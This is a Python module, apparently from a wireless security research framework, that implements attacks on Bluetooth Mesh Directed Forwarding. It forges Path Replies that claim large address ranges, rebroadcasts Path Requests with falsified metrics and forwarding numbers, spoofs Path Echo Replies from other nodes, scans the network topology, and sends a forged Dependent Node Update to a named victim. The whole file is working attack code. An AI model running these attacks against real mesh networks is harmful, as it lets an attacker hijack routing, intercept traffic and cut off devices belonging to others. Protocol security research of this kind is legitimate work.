from whad.btmesh.stack.upper_transport import UpperTransportLayer
from whad.btmesh.stack.access.df_attacks import DFAttacksAccessLayer
from whad.btmesh.stack.access import AccessLayer
from whad.common.stack import alias
from whad.scapy.layers.btmesh import (
    BTMesh_Upper_Transport_Access_PDU,
    BTMesh_Model_Message,
    BTMesh_Upper_Transport_Control_Heartbeat,
    BTMesh_Upper_Transport_Control_Path_Reply,
    BTMesh_Upper_Transport_Control_Friend_Poll,
    BTMesh_Upper_Transport_Control_Friend_Clear,
    BTMesh_Upper_Transport_Control_Path_Request,
    BTMesh_Upper_Transport_Control_Friend_Offer,
    BTMesh_Upper_Transport_Control_Path_Echo_Reply,
    BTMesh_Upper_Transport_Control_Friend_Update,
    BTMesh_Upper_Transport_Control_Path_Confirmation,
    BTMesh_Upper_Transport_Control_Friend_Request,
    BTMesh_Upper_Transport_Control_Friend_Clear_Confirm,
    BTMesh_Upper_Transport_Control_Path_Request_Solicitation,
    BTMesh_Upper_Transport_Control_Dependent_Node_Update,
    BTMesh_Upper_Transport_Control_Path_Echo_Request,
    BTMesh_Upper_Transport_Control_Friend_Subscription_List_Add,
    BTMesh_Upper_Transport_Control_Friend_Subscription_List_Remove,
    BTMesh_Upper_Transport_Control_Friend_Subscription_List_Confirm,
    UnicastAddr,
)
from whad.btmesh.stack.utils import MeshMessageContext
from whad.btmesh.stack.constants import (
    DIRECTED_FORWARDING_CREDS,
    MANAGED_FLOODING_CREDS,
)
from threading import Thread, Timer
from copy import copy
from time import sleep


@alias("upper_transport")
class UpperTransportDFAttacks(UpperTransportLayer):
    """
    Upper Transport Layer tweaked for attacks on Directed Forwarding Control messages.
    """

    def configure(self, options={}):
        """
        UpperTransportlayer. One for all the networks.
        For now we just discard the control messages since we dont support any of the features
        """
        super().configure(options=options)

        self._handlers[BTMesh_Upper_Transport_Control_Path_Request] = (
            self.on_path_request_react
        )
        self._handlers[BTMesh_Upper_Transport_Control_Path_Confirmation] = (
            self.on_path_confirmation
        )
        self._handlers[BTMesh_Upper_Transport_Control_Path_Reply] = self.on_path_reply

        # Path requests already processed once/sent by us
        # Key is path_origin:FWN
        self.path_requests_processed = {}

        # used to track sequence number to be used for path echo replies. Key (path_origin:path_target) -> (seq number, creds)
        # if seq is None, use our sequence number
        self.path_echo_reply_list = {}

        # Stores the nodes discovered in the network
        # key is range start, tuple is (range_length, hops)
        self.topology = {}

        self.a2_activated = False

        # Will be replaced by DFAttacksAccessLayer
        self.remove(AccessLayer)
        self.add(DFAttacksAccessLayer)

    def on_path_request_react(self, message):
        """
        On path request react, attacks A2 and A3
        We admit that the unused address in the Path Soliciation is 0x7FE1

        :param message: The Path request message and its context
        :type message: (BTMesh_Upper_Transport_Control_Path_Request, MeshMessageContext)
        """
        pkt, ctx = message
        key = str(pkt.path_origin_unicast_addr_range.range_start) + str(
            pkt.path_origin_forwarding_number
        )

        # If we already received that Path Request, discard
        if key in self.path_requests_processed.keys():
            return

        self.path_requests_processed[key] = message
        if pkt.destination == 0x7E00:
            self.a3_path_request_react(message)

        if self.state.profile.is_unicast_addr_ours(pkt.destination):
            self.classic_path_request_react(message)

        elif self.a2_activated:
            self.a2_path_request_react(message)

    def a3_path_request_react(self, message):
        """
        Actions for the A2 attack on a path request

        :param message: Packet and its context
        :type message: (BTMesh_Upper_Transport_Control_Path_Request, MeshMessageContext)
        """
        pkt, ctx = message
        resp_pkt = BTMesh_Upper_Transport_Control_Path_Reply(
            unicast_destination=1,
            on_behalf_of_dependent_target=1,
            confirmation_request=0,
            path_origin=pkt.path_origin_unicast_addr_range.range_start,
            path_origin_forwarding_number=pkt.path_origin_forwarding_number,
            path_target_unicast_addr_range=UnicastAddr(
                length_present=1, range_start=0x0001 & 0x7FFF, range_length=0xFF
            ),
            dependent_target_unicast_addr_range=UnicastAddr(
                length_present=1,
                range_length=0xFF,
                range_start=0x7E00 & 0x7FFF,
            ),
        )
        resp_ctx = copy(ctx)
        resp_ctx.src_addr = self.state.profile.primary_element_addr.to_bytes(2, "big")
        resp_ctx.dest_addr = ctx.src_addr
        resp_ctx.creds = DIRECTED_FORWARDING_CREDS
        timer = Timer(
            1,
            self.send_control_message,
            args=[(resp_pkt, resp_ctx)],
        )
        timer = Timer(
            1.5,
            self.send_control_message,
            args=[(resp_pkt, resp_ctx)],
        )

        timer.start()
        timer = Timer(
            1.5,
            self.send_control_message,
            args=[(resp_pkt, resp_ctx)],
        )

        timer.start()

        # start path echo reply thread
        key = str(resp_pkt.path_origin) + str(
            resp_pkt.path_target_unicast_addr_range.range_start
        )
        self.path_echo_reply_list[key] = (1, MANAGED_FLOODING_CREDS)
        echo_reply_timer = Timer(
            3,
            self.path_echo_reply_send,
            args=[
                resp_pkt.path_origin,
                resp_pkt.path_target_unicast_addr_range.range_start,
            ],
        )
        echo_reply_timer.start()

    def classic_path_request_react(self, message):
        """
        Path requestt for our address, create "normal" 2way path

        :param message: Message and its context
        :type message: (BTMesh_Upper_Transport_Control_Path_Request, MeshMessageContext)
        """
        pkt, ctx = message
        resp_pkt = BTMesh_Upper_Transport_Control_Path_Reply(
            unicast_destination=1,
            on_behalf_of_dependent_target=0,
            confirmation_request=1,
            path_origin=pkt.path_origin_unicast_addr_range.range_start,
            path_origin_forwarding_number=pkt.path_origin_forwarding_number,
            path_target_unicast_addr_range=UnicastAddr(
                length_present=0,
                range_start=self.state.profile.primary_element_addr & 0x7FFF,
            ),
        )
        resp_ctx = copy(ctx)
        resp_ctx.src_addr = self.state.profile.primary_element_addr.to_bytes(2, "big")
        resp_ctx.dest_addr = ctx.src_addr
        resp_ctx.creds = DIRECTED_FORWARDING_CREDS
        timer = Timer(
            1,
            self.send_control_message,
            args=[(resp_pkt, resp_ctx)],
        )
        timer.start()

        key = str(resp_pkt.path_origin) + str(
            resp_pkt.path_target_unicast_addr_range.range_start
        )
        self.path_echo_reply_list[key] = (None, MANAGED_FLOODING_CREDS)
        echo_reply_timer = Timer(
            3,
            self.path_echo_reply_send,
            args=[
                resp_pkt.path_origin,
                resp_pkt.path_target_unicast_addr_range.range_start,
            ],
        )
        echo_reply_timer.start()

    def a2_path_request_react(self, message):
        """
        Request on any path request received not for us.
        A2 attack (big one, not super impactful but fun tho)

        :param message: Message and its context
        :type message: (BTMesh_Upper_Transport_Control_Path_Request, MeshMessageContext)
        """

        pkt, ctx = message

        # Sending a Path Reply to the node that sent us the Path Request
        resp_ctx = MeshMessageContext()
        resp_ctx.creds = DIRECTED_FORWARDING_CREDS
        resp_ctx.src_addr = self.state.profile.primary_element_addr.to_bytes(2, "big")
        resp_ctx.dest_addr = ctx.src_addr
        resp_ctx.ttl = 0
        resp_ctx.is_ctl = True
        resp_ctx.net_key_id = 0

        # optimize the target ranges to get the first 512 addr possible from 1 to 512
        # we always make sure that either the path_target or dependent target contain the 255 first addrs
        destination_start = (pkt.destination // 255) * 255 + 1
        dep_nodes_start = (int(destination_start == 0) + 1) * 255 + 1

        resp_pkt = BTMesh_Upper_Transport_Control_Path_Reply(
            unicast_destination=1,
            on_behalf_of_dependent_target=1,
            confirmation_request=0,
            path_origin=pkt.path_origin_unicast_addr_range.range_start,
            path_origin_forwarding_number=pkt.path_origin_forwarding_number,
            path_target_unicast_addr_range=UnicastAddr(
                length_present=1, range_start=dep_nodes_start, range_length=0xFF
            ),
            dependent_target_unicast_addr_range=UnicastAddr(
                length_present=1,
                range_length=0xFF,
                range_start=destination_start,
            ),
        )
        resp_pkt.show()
        self.send_control_message((
            resp_pkt,
            resp_ctx,
        ))

        # start path echo reply thread
        key = str(resp_pkt.path_origin) + str(
            resp_pkt.path_target_unicast_addr_range.range_start
        )
        self.path_echo_reply_list[key] = (1, MANAGED_FLOODING_CREDS)
        echo_reply_timer = Timer(
            4,
            self.path_echo_reply_send,
            args=[
                resp_pkt.path_origin,
                resp_pkt.path_target_unicast_addr_range.range_start,
            ],
        )
        echo_reply_timer.start()

        # Sending the forged Path Request with best metric
        resp_pkt = copy(pkt)
        resp_pkt.path_origin_path_metric = 0

        resp_ctx = copy(ctx)
        resp_ctx.creds = DIRECTED_FORWARDING_CREDS
        resp_ctx.src_addr = self.state.profile.primary_element_addr.to_bytes(2, "big")
        resp_ctx.dest_addr = b"\xff\xfb"
        resp_ctx.ttl = 0
        resp_ctx.is_ctl = True
        resp_ctx.net_key_id = 0

        resp_pkt.show()
        self.send_control_message((
            resp_pkt,
            resp_ctx,
        ))

        # Launch the sequence number desynch to avoid lane creation
        timer = Timer(1, self.path_request_react_send_request_lane, args=[message])
        timer.start()

    def on_path_confirmation(self, message):
        """
        On path confirmation. If for us, update credentials used for Path Echo Reply

        :param message: [TODO:description]
        :type message: [TODO:type]
        """

        pkt, ctx = message
        if self.state.profile.is_unicast_addr_ours(
            pkt.path_origin,
        ):
            key = str(pkt.path_origin) + str(pkt.path_target)
            self.path_echo_reply_list[key] = (None, DIRECTED_FORWARDING_CREDS)

    def on_path_reply(self, message):
        """
        On Path Reply received
        For network discovery (A1), or for A5 (dependent_nodes_update attack)

        :param message: Path Reply Received with its context
        :type message: (BTMesh_Upper_Transport_Control_Path_Reply,MeshMessageContext)
        """

        pkt, ctx = message
        # reply probably for the topology discovery
        if pkt.path_origin == 0x7FFF:
            if pkt.path_target_unicast_addr_range.length_present:
                range_length = pkt.path_target_unicast_addr_range.range_length
            else:
                range_length = 0

            self.topology[pkt.path_target_unicast_addr_range.range_start] = (
                range_length,
                -1,
            )
            return

        # Send Path Confirmation if Path Reply for our address. For A5 attack, send a dependent_nodes_update afterwards
        if self.state.profile.is_unicast_addr_ours(pkt.path_origin):
            if pkt.confirmation_request == 1:
                resp_pkt = BTMesh_Upper_Transport_Control_Path_Confirmation(
                    path_origin=pkt.path_origin,
                    path_target=pkt.path_target_unicast_addr_range.range_start,
                )
                resp_ctx = MeshMessageContext()
                resp_ctx.creds = DIRECTED_FORWARDING_CREDS
                resp_ctx.src_addr = self.state.profile.primary_element_addr.to_bytes(
                    2, "big"
                )
                resp_ctx.dest_addr = b"\xff\xfb"
                resp_ctx.ttl = 0
                resp_ctx.is_ctl = True
                resp_ctx.net_key_id = 0
                timer = Timer(1, self.send_control_message, args=[(resp_pkt, resp_ctx)])
                timer.start()

                # update credentials for echo reply
                key = str(pkt.path_origin) + str(
                    pkt.path_target_unicast_addr_range.range_start
                )
                self.path_echo_reply_list[key] = (None, DIRECTED_FORWARDING_CREDS)

                dep_pkt = BTMesh_Upper_Transport_Control_Dependent_Node_Update(
                    type=1,
                    path_endpoint=pkt.path_origin,
                    dependent_node_unicast_addr_range=UnicastAddr(
                        range_start=0x0001, length_present=1, range_length=0xFF
                    ),
                )

                dep_ctx = copy(resp_ctx)
                thread = Timer(3, self.send_control_message, args=[(dep_pkt, dep_ctx)])
                thread.start()

    def discover_topology_thread(self, addr_low, addr_high):
        """
        "Attack" to discover all the nodes that support DF (they all should ...) and the distance to them

        We send PATH_REQUEST with a PATH_ORIGIN that doesnt exist (very high address) for all the addrs in the range specified

        :param addr_low: [TODO:description]
        :type addr_low: [TODO:type]
        :param addr_high: [TODO:description]
        :type addr_high: [TODO:type]
        """
        base_pkt = BTMesh_Upper_Transport_Control_Path_Request(
            on_behalf_of_dependent_origin=0,
            path_origin_path_metric_type=0,
            path_discovery_interval=0,
            path_origin_path_lifetime=0,
            path_origin_path_metric=0,
            destination=0,
            path_origin_unicast_addr_range=UnicastAddr(range_start=0x7FFF),
        )
        base_ctx = MeshMessageContext()
        base_ctx.creds = DIRECTED_FORWARDING_CREDS
        base_ctx.src_addr = self.state.profile.primary_element_addr.to_bytes(2, "big")
        base_ctx.dest_addr = b"\xff\xfb"  # all directed forwading nodes
        base_ctx.ttl = 0
        base_ctx.is_ctl = True
        base_ctx.net_key_id = 0

        for dest in range(addr_low, addr_high + 1):
            base_pkt.destination = dest
            self.send_control_message((
                base_pkt,
                base_ctx,
            ))
            sleep(0.2)

    def get_network_topology(self):
        return self.topology

    def a3_attack(self, addr_list):
        """
        Lauches the a2 attack (path_request_solicitation)
        The list of addresses is the list to put in the Path Request Soliciation message.
        The unused address for the malicious path is always

        :param addr_list: List of addr to put in the Path Solicitation message
        :type addr_list: List[int]
        """
        addr_list.insert(0, 0x7E00)
        pkt = BTMesh_Upper_Transport_Control_Path_Request_Solicitation(
            addr_list=addr_list
        )
        pkt.show()
        ctx = MeshMessageContext()
        ctx.creds = DIRECTED_FORWARDING_CREDS
        ctx.src_addr = self.state.profile.primary_element_addr.to_bytes(2, "big")
        ctx.dest_addr = b"\xff\xfb"  # all directed forwading nodes
        ctx.ttl = 0x7F
        ctx.is_ctl = True
        ctx.net_key_id = 0

        self.send_control_message((
            pkt,
            ctx,
        ))

    def a2_attack(self, action):
        """
        Activates or deactivates the A2 attack reaction to Path Request

        :param action: True to activate, False to deactivate
        :type action: Bool
        """
        self.a2_activated = action

    def a5_attack(self, victim_addr):
        """
        Launched the A5 attack.
        Sends a Path Request to the victim. Expects a Path Reply with confirmation.
        We then send the PAth Conformation, and finally send a dependent_nodes_update message.

        :param victim_addr: Addr of the victim
        :type victim_addr: int
        """

        pkt = BTMesh_Upper_Transport_Control_Path_Request(
            on_behalf_of_dependent_origin=0,
            path_origin_path_metric_type=0,
            path_discovery_interval=0,
            path_origin_path_lifetime=0,
            path_origin_path_metric=0,
            destination=victim_addr,
            path_origin_unicast_addr_range=UnicastAddr(
                range_start=self.state.profile.primary_element_addr & 0x7FFF
            ),
        )

        ctx = MeshMessageContext()
        ctx.creds = DIRECTED_FORWARDING_CREDS
        ctx.src_addr = self.state.profile.primary_element_addr.to_bytes(2, "big")
        ctx.dest_addr = b"\xff\xfb"  # all directed forwading nodes
        ctx.ttl = 0
        ctx.is_ctl = True
        ctx.net_key_id = 0
        key = str(pkt.path_origin_unicast_addr_range.range_start) + str(
            pkt.path_origin_forwarding_number
        )
        self.path_requests_processed[key] = (pkt, ctx)

        self.send_control_message((
            pkt,
            ctx,
        ))

    def path_echo_reply_send(self, path_origin, path_target):
        """
        Launched in a thread to regularly send path echo reply messages for tampered paths

        :param path_origin: Primary Address of the PO
        :type path_origin: int
        :param path_target: Primary address of the PT
        :type path_target: int
        """
        while True:
            key = str(path_origin) + str(path_target)
            seq, creds = self.path_echo_reply_list[key]
            pkt = BTMesh_Upper_Transport_Control_Path_Echo_Reply(
                destination=path_target
            )
            ctx = MeshMessageContext()
            ctx.creds = creds
            ctx.src_addr = path_target.to_bytes(2, "big")
            ctx.dest_addr = path_origin.to_bytes(2, "big")
            ctx.ttl = 0x7F
            ctx.is_ctl = True
            ctx.net_key_id = 0
            if seq is not None:
                ctx.seq_number = seq
                self.path_echo_reply_list[key] = (seq + 1, creds)

            self.send_control_message((
                pkt,
                ctx,
            ))
            sleep(4.5)

    def path_request_react_send_request_lane(self, message):
        """
        For attack A2, functioned called 500ms after receiving the Path Request. Used to send a Path Request to keep nodes from creating lanes

        :param message: Original Path Request message received
        :type message: (BTMesh_Upper_Transport_Control_Path_Request, MeshMessageContext)
        """
        pkt, ctx = message

        resp_ctx = copy(ctx)
        resp_pkt = copy(pkt)
        resp_pkt.path_origin_path_metric = 0
        resp_pkt.path_origin_forwarding_number = pkt.path_origin_forwarding_number + 1

        resp_ctx.creds = DIRECTED_FORWARDING_CREDS
        resp_ctx.src_addr = self.state.profile.primary_element_addr.to_bytes(2, "big")
        resp_ctx.dest_addr = b"\xff\xfb"
        resp_ctx.ttl = 0
        resp_ctx.is_ctl = True
        resp_ctx.net_key_id = 0

        key = str(resp_pkt.path_origin_unicast_addr_range.range_start) + str(
            resp_pkt.path_origin_forwarding_number
        )
        self.path_requests_processed[key] = message

        resp_pkt.show()
        self.send_control_message((
            resp_pkt,
            resp_ctx,
        ))
